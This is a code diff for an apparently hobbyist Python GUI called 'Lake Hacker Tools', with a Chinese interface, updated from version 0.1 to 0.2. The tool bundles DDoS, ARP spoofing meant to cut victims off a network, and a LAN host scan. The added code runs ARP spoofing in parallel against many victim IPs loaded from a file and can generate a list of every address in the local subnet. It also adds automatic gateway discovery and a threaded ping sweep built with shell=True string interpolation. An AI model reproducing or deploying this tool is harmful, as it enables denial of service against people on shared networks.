@@ -1,5 +1,5 @@
 import time
-import threading
+import threading 
 import tkinter as tk
 from tkinter import messagebox
 import socket
@@ -7,7 +7,12 @@ import random
 import tkinter.ttk
 from tkinter.filedialog import askopenfilename
 from tkinter.filedialog import asksaveasfilename
-from scapy.all import ARP, Ether, srp, sendp
+from scapy.all import *
+import subprocess
+import re
+import platform
+
+from scapy.layers.l2 import ARP, Ether
 
 lock = threading.Lock()
 openNum = 0
@@ -20,6 +25,9 @@ nmap_open = False
 ddos_size_1_random = False
 ddos_size_2_random = False
 arp_open = False
+findip_ok = False
+arp_ip_list = []
+arp_many_ip = False
 
 def error(string,parent):
     messagebox.showerror(title="错误",message=string,parent=parent)
@@ -37,6 +45,7 @@ def fint(n):
         return True
     except:
         return False
+# 尝试获取IP
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.connect(('baidu.com', 80))
@@ -47,7 +56,7 @@ except socket.error:
 
 # 创建主窗口
 root_main = tk.Tk()
-root_main.title("LakeV0.1")
+root_main.title("LakeV0.2")
 root_main.geometry("300x200")
 
 # ddos窗口
@@ -367,8 +376,12 @@ def open_arp_window():
     def start_arp():
         global arp_open
         def start():
-            arp(arp_victimIP.get(),arp_gatewayIP.get(),int(arp_time.get()))
-        if arp_victimIP.get()!="":
+            if arp_many_ip:
+                for i in range(len(arp_ip_list)):
+                    threading.Thread(target=arp,args=(arp_ip_list[i],arp_gatewayIP.get(),int(arp_time.get()))).start()
+            else:
+                arp(arp_victimIP.get(),arp_gatewayIP.get(),int(arp_time.get()))
+        if arp_victimIP.get()!="" or arp_many_ip==True:
             if arp_gatewayIP.get()!="":
                 if float(arp_time.get()):
                     arp_open = True
@@ -383,21 +396,67 @@ def open_arp_window():
         global arp_open
         arp_open = False
         showinfo("已关闭arp欺骗",root_arp)
+    def get_gatewayIP():
+        result = subprocess.run(['route', 'print'], capture_output=True, text=True)
+        output = result.stdout
+        gateway_pattern = r"0.0.0.0\s+0.0.0.0\s+(\d+\.\d+\.\d+\.\d+)"
+        gateway_match = re.search(gateway_pattern, output)
+        if gateway_match:
+            default_gateway = gateway_match.group(1)
+        if default_gateway:
+            arp_gatewayIP.set(default_gateway)
+        else:
+            error("找不到网关",root_arp)
+    def open_ipfile():
+        global arp_many_ip
+        open_path = askopenfilename(title="选择文件",filetypes=[('txt文档','*.txt')],parent=root_arp)
+        if open_path!="":
+            temp = open(open_path,"r").read()
+            temp = temp.split("\n")
+            for i in range(len(temp)):
+                arp_ip_list.append(temp[i])
+            arp_many_ip = True
+            many_victimIP.set(f"共 {len(temp)} 个IP")
+            victimIP_e.place_forget()
+            close_many_victimI_b.place(x=300,y=30)
+    def close_ipfile():
+        global arp_many_ip
+        arp_many_ip = False
+        victimIP_e.place(x=70,y=30)
+        close_many_victimI_b.place_forget()
+    def make_allipfile():
+        save_path = asksaveasfilename(title='选择保存路径',initialfile=ip,filetypes=[('txt文档','*.txt')],parent=root_arp)
+        if save_path != "":
+            s = ""
+            ip_parts = ip.split('.')
+            ip_prefix = '.'.join(ip_parts[:-1])
+            for i in range(255):
+                s += ip_prefix + "." + str(i) + "\n"
+            s += ip_prefix + ".255"
+            open(save_path+".txt","w",encoding="utf-8").write(s)
+            showinfo("保存成功",root_arp)
 
     arp_victimIP = tk.StringVar()
     arp_gatewayIP = tk.StringVar()
     arp_time = tk.StringVar()
     arp_time.set("1")
+    many_victimIP = tk.StringVar()
     
     tk.Label(root_arp,text="arp断网").place(x=90,y=0)
     tk.Label(root_arp,text="受害者IP：").place(x=0,y=30)
-    tk.Entry(root_arp,textvariable=arp_victimIP).place(x=70,y=30)
+    tk.Label(root_arp,textvariable=many_victimIP).place(x=70,y=30)
+    victimIP_e = tk.Entry(root_arp,textvariable=arp_victimIP)
+    victimIP_e.place(x=70,y=30)
     tk.Label(root_arp,text="网关IP：").place(x=0,y=60)
     tk.Entry(root_arp,textvariable=arp_gatewayIP).place(x=70,y=60)
     tk.Label(root_arp,text="发送间隔：").place(x=0,y=90)
     tk.Entry(root_arp,textvariable=arp_time).place(x=70,y=90)
     tk.Button(root_arp,text="开始arp欺骗",command=start_arp).place(x=20,y=120)
     tk.Button(root_arp,text="关闭arp欺骗",command=close_arp).place(x=110,y=120)
+    tk.Button(root_arp,text="获取网关",command=get_gatewayIP).place(x=230,y=60)
+    tk.Button(root_arp,text="导入多个IP",command=open_ipfile).place(x=230,y=30)
+    close_many_victimI_b = tk.Button(root_arp,text="关闭多个IP",command=close_ipfile)
+    tk.Button(root_arp,text="生成全部IP地址",command=make_allipfile).place(x=230,y=0)
 
     root_arp.mainloop()
 # 查看同局域网的活主机窗口
@@ -410,31 +469,63 @@ def open_findip_window():
     ip_show = tk.StringVar()
 
     def start_find():
+        global findip_ok
         def start():
-            if ip!=None:
-                try:
-                    arp = ARP(pdst=ip+"/24")
-                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-                    packet = ether/arp
-                    result = srp(packet, timeout=3, verbose=0)[0]
-                    active_hosts = ""
-                    for sent, received in result:
-                        active_hosts+=f"ip:{received.psrc} mac:{received.hwsrc}\n"
-                    ip_show.set(active_hosts)
-                    ip_showing.set("扫描成功")
-                except Exception as e:
-                    error(e,root_findip)
-            else:
-                error("IP获取失败",root_findip)
+            global findip_ok
+            try:
+                def ping(host):
+                    ping_cmd = f"ping -n 1 {host}" if platform.system().lower() == "windows" else f"ping -c 1 {host}"
+                    try:
+                        output = subprocess.check_output(ping_cmd, shell=True, universal_newlines=True)
+                        if "TTL=" in output:
+                            return True
+                    except subprocess.CalledProcessError:
+                        pass
+                    return False
+                def scan_host(ip, active_hosts):
+                    if ping(ip):
+                        active_hosts.append(ip)
+                ip_parts = ip.split('.')
+                ip_prefix = '.'.join(ip_parts[:-1])
+                active_hosts = []
+                threads = []
+                for i in range(1, 256):
+                    ip_t = ip_prefix + '.' + str(i)
+                    thread = threading.Thread(target=scan_host, args=(ip_t, active_hosts))
+                    thread.start()
+                    threads.append(thread)
+                for thread in threads:
+                    thread.join()
+                s = ""
+                for i in range(len(active_hosts)):
+                    s += active_hosts[i]+"\n"
+                findip_ok = True
+                ip_show.set(s)
+                ip_showing.set("扫描完毕")
+                showinfo("扫描完毕",root_findip)
+            except Exception as e:
+                error(e,root_findip)
+        findip_ok = False
         ip_showing.set("扫描中...")
         threading.Thread(target=start).start()
+    def save_ipfile():
+        if findip_ok:
+            save_path = asksaveasfilename(title='选择保存路径',initialfile=ip,filetypes=[('txt文档','*.txt')],parent=root_findip)
+            if save_path != "":
+                s = ip_show.get()
+                open(save_path+".txt","w",encoding="utf-8").write(s)
+                showinfo("保存成功",root_findip)
+        else:
+            error("你还未扫描",root_findip)
     tk.Button(root_findip,text="开始查找",command=start_find).place(x=170,y=0)
     tk.Label(root_findip,textvariable=ip_show).place(x=0,y=30)
     tk.Label(root_findip,textvariable=ip_showing).place(x=250,y=0)
+    tk.Button(root_findip,text="导出IP地址",command=save_ipfile).place(x=0,y=0)
     root_findip.mainloop()
 tk.Label(root_main,text="Lake Hacker Tools 给你一个黑客的世界").place(x=0,y=0)
 tk.Button(root_main,text="ddos",command=open_ddos_window).place(x=0,y=30)
 tk.Button(root_main,text="arp欺骗",command=open_arp_window).place(x=0,y=60)
 tk.Button(root_main,text="查看同局域网的活主机",command=open_findip_window).place(x=165,y=30)
+tk.Label(root_main,text=f"你的IP：{ip}").place(x=0,y=180)
 
 root_main.mainloop()
